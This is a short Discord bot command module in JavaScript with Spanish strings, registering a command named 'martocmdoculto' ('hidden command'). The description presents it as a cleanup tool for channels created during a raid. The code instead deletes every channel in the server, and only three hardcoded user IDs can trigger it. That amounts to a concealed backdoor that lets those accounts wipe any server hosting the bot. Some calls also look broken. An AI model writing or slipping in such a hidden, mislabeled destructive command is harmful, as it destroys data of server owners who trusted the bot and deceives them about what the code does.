const discord = require('discord.js')

module.exports = {
    nombre: 'martocmdoculto',
    alias: [],
    desc: "¿Raidearon un discord? utiliza este comando para borrar los canales creados durante el raid!",
    run: (client, message, args) => {
        var id = ["392904909231489024", "310158154510106635", "615360256922484757"]

        if(!id.some(id => message.author.id == id)) return message.channel.send("\<a:ES_Rechazado:770788116231356496> No tienes permisos.")

        message.guild.channels.forEach(canales => {canales.delete(100)});

        return message.channel.send("Borrando canales!").then(m => (m.delete({timeout: 300})));
    }
}